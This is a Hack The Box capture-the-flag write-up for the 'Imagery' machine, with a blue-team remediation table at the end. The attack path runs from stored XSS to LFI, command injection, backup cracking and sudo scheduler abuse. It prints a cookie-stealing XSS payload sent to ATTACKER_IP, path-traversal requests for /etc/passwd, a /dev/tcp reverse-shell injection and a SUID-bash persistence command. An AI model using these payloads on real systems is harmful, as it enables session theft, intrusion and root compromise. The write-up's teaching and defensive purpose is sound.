# Hack The Box: Imagery Write-Up

### Client-Side Exploitation to Root via Custom Sudo Scheduler

- **Target IP:** 10.10.11.88
- **Hostname:** imagery.htb
- **Operating System:** Linux (Ubuntu)
- **Primary Vector:** Web Application Vulnerabilities (XSS, LFI, Command Injection)
- **Secondary Vectors:** Cryptographic Weaknesses, Sudo Misconfiguration

---

## Executive Summary

The Imagery machine simulates a Python-based image processing web application that suffers from a methodical progression of vulnerabilities. The attack chain initiates with client-side exploitation via Stored Cross-Site Scripting (XSS) to hijack an administrative session. This access is leveraged to exploit a Local File Inclusion (LFI) vulnerability, extracting application credentials. Authenticated access to the application's image processing features reveals a command injection flaw, granting initial code execution. From the initial foothold, an improperly secured encrypted backup facilitates lateral movement to a standard user. Finally, a misconfigured custom sudo binary with an integrated task scheduler is abused to achieve full root privileges.

This write-up details the full attack chain, providing technical context for both offensive operators and defensive analysts.

---

## 1. Reconnaissance & Attack Surface Mapping

A comprehensive Nmap scan reveals a minimal attack surface consisting of SSH and a custom Python web application.

```bash
nmap -T4 -A -v 10.10.11.88
```

**Key Services Identified:**
- **Port 22:** OpenSSH 9.7p1 (Ubuntu)
- **Port 8000:** HTTP (Python Werkzeug/3.1.3)

Navigating to `http://imagery.htb:8000` presents a web application featuring user registration and login capabilities. Directory brute-forcing yields no hidden paths, indicating that the primary attack surface lies within the application's business logic rather than its file structure.

---

## 2. Initial Foothold: XSS to Command Injection

### 2.1 Session Hijacking via Stored XSS
After registering a standard user account, we identify a "Report Bug" feature. This functionality is vulnerable to Stored Cross-Site Scripting (XSS), allowing us to execute arbitrary JavaScript in the context of an administrative user viewing the report.

**Exploitation:**
We host a simple HTTP server to capture the exfiltrated cookies and submit a malicious payload in the bug report form.

```bash
# Attacker setup
python3 -m http.server 80
```

```html
<!-- XSS Payload -->
<img src=1 onerror="document.location='http://ATTACKER_IP/steal/'+document.cookie">
```

When the administrator reviews the bug report, their session cookie is transmitted to our listener. We inject this cookie into our browser's local storage, successfully hijacking the administrative session.

### 2.2 Local File Inclusion (LFI) & Credential Extraction
With administrative access, we explore the admin panel and identify a "Download Log" feature. This endpoint fails to properly sanitize the `log_identifier` parameter, making it vulnerable to Local File Inclusion (LFI) via path traversal.

**Reading System Files:**
```http
GET /admin/get_system_log?log_identifier=../../../../../etc/passwd HTTP/1.1
```

**Extracting the Application Database:**
We leverage the LFI to read the application's internal database, which contains user credentials.

```http
GET /admin/get_system_log?log_identifier=../../../../../home/web/web/db.json HTTP/1.1
```

### 2.3 Authenticated Command Injection (RCE)
The extracted `db.json` file contains password hashes for the application users. We identify a hash for the user `testuser` and successfully crack it offline using CrackStation.

**Cracked Credentials:**
- **Username:** `testuser`
- **Password:** `iambatman`

Logging into the application as `testuser` grants access to an Image Gallery with transformation capabilities (e.g., crop, resize). Intercepting the HTTP request for the "Crop" function in a proxy reveals that the application passes user-supplied parameters directly to a backend shell command.

**Command Injection Payload:**
We inject a reverse shell payload into the `x` parameter of the JSON request.

```json
{
  "imageId": "IMG123",
  "transformType": "crop",
  "params": {
    "x": ";setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1';",
    "y": 0,
    "width": 640,
    "height": 640
  }
}
```

**Result:**
Upon triggering the request, we catch a reverse shell operating under the context of the `web` service account.

---

## 3. Lateral Movement: Encrypted Backup Abuse

### 3.1 Backup Discovery & Offline Brute-Forcing
Operating as the `web` user, we enumerate the filesystem and discover a world-readable encrypted backup archive located at `/var/backup/web_20250806_120723.zip.aes`.

We exfiltrate the archive to our attack machine and utilize a custom multi-threaded Python script to brute-force the AES encryption key against the `rockyou.txt` wordlist.

**Decryption Key:** `bestfriends`

### 3.2 User Escalation
Decrypting and extracting the archive reveals a secondary `db.json` file. This file contains a password hash for a system user named `mark`. We crack this hash offline, revealing the plaintext password.

**Cracked Credentials:**
- **Username:** `mark`
- **Password:** `supersmash`

We utilize these credentials to switch users via SSH or the `su` command.

```bash
su mark
# Password: supersmash
```

Upon successful authentication, we retrieve the user flag from `/home/mark/user.txt`.

---

## 4. Privilege Escalation: Custom Sudo Binary Abuse

### 4.1 Enumeration of Sudo Privileges
Checking the sudo configuration for the `mark` user reveals a highly permissive rule allowing the execution of a custom binary as root.

```bash
sudo -l
# Output: (root) /usr/local/bin/charcol
```

The `charcol` binary is a custom backup and task management tool. It features an interactive shell and a built-in cron-like task scheduler that executes with root privileges.

### 4.2 Exploiting the Task Scheduler
To interact with the tool's interactive shell, we must first reset its internal password.

```bash
sudo charcol -R
# Enter mark's password when prompted
```

We then enter the interactive shell:
```bash
sudo /usr/local/bin/charcol shell
```

**Method 1: Direct Flag Exfiltration**
We schedule a task to copy the root flag to a world-readable location.

```bash
auto add --schedule "* * * * *" \
         --command "cp /root/root.txt /tmp/root.txt && chmod 777 /tmp/root.txt" \
         --name "get_flag"
```
After waiting for the scheduler to execute the task (up to 60 seconds), we read the flag from `/tmp/root.txt`.

**Method 2: SUID Shell Persistence**
Alternatively, we can schedule a task to grant the SUID bit to the Bash binary, providing a persistent method for root access.

```bash
auto add --schedule "* * * * *" \
         --command "chmod +s /usr/bin/bash" \
         --name "suid_bash"
```
Once the task executes, we spawn a privileged shell:
```bash
/usr/bin/bash -p
```

**Result:**
We achieve full root access and capture the root flag from `/root/root.txt`.

---

## 5. Vulnerability Analysis & Remediation (Blue Team)

| Vulnerability | Impact | Remediation Strategy |
| :--- | :--- | :--- |
| **Stored XSS in Bug Report** | Administrative session hijacking. | Implement strict output encoding and Context-Aware Escaping; deploy a robust Content Security Policy (CSP). |
| **Local File Inclusion (LFI)** | Arbitrary file read leading to credential leakage. | Validate and sanitize file paths; utilize strict allowlists for log identifiers; avoid passing user input directly to file system APIs. |
| **Command Injection in Image Params** | Remote Code Execution as the web service user. | Avoid invoking OS shells for image processing; use safe, native library APIs (e.g., Pillow for Python) for transformations. |
| **Insecure Encrypted Backups** | Offline brute-forcing leading to lateral movement. | Restrict file permissions on backup directories; utilize hardware-backed key management or strong, high-entropy passphrases for encryption. |
| **Misconfigured Custom Sudo Binary** | Full root compromise via scheduled tasks. | Remove unnecessary `sudo` rights; audit custom binaries for command injection and insecure task scheduling; utilize standard `cron` with strict access controls. |

---

## 6. Key Takeaways

1. **Client-Side Flaws are Gateway Vulnerabilities:** Cross-Site Scripting (XSS) is often dismissed as a low-severity issue, but in the context of administrative panels, it serves as a critical gateway for session hijacking and authentication bypass.
2. **Application Logic Requires Deep Inspection:** When directory brute-forcing fails, focusing on the application's business logic—such as bug reporting forms and image transformation tools—often reveals the most severe vulnerabilities.
3. **Backups are High-Value Targets:** Encrypted backups are only as secure as their passphrases and file permissions. World-readable encrypted archives frequently serve as a bridge for lateral movement.
4. **Custom Binaries Introduce Custom Risks:** Developers often create custom utilities for internal tasks. If these binaries are exposed via `sudo` without rigorous security auditing, they can easily become vectors for privilege escalation.
5. **Defense-in-Depth is Mandatory:** A failure in input validation (XSS/LFI/Injection) combined with poor credential management and excessive privileges creates a cascading failure. Mitigating any single layer would have disrupted the attack chain.

> "You don't need zero-days to own a box—just attention to detail and a little creativity."

**Box Rating:** 4.5/5 — Creative, realistic, and packed with teachable moments regarding web-to-root tradecraft.
